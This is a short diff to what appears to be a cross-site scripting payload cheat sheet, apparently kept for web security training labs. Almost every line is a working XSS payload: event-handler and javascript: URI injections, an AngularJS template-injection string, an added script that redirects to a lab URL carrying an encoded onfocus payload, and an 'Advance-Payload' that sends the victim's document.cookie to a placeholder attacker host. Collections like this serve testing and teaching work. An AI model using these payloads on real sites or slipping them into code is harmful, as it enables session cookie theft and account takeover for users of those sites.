@@ -13,4 +13,7 @@ javascript:alert(document.domain)
 Simple-Payload: ">\/></div><a onClick="top[['alert'][0]]('tehlan')">Click ME</a>
 Advance-Payload: ">\/></div><a onClick="top['location']['href']='//your-burp-url/?c='+document.cookie">Click ME</a>
 angular js : {{$on.constructor('alert(1)')()}}
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
 https://www.vulnerability-lab.com/resources/documents/531.txt
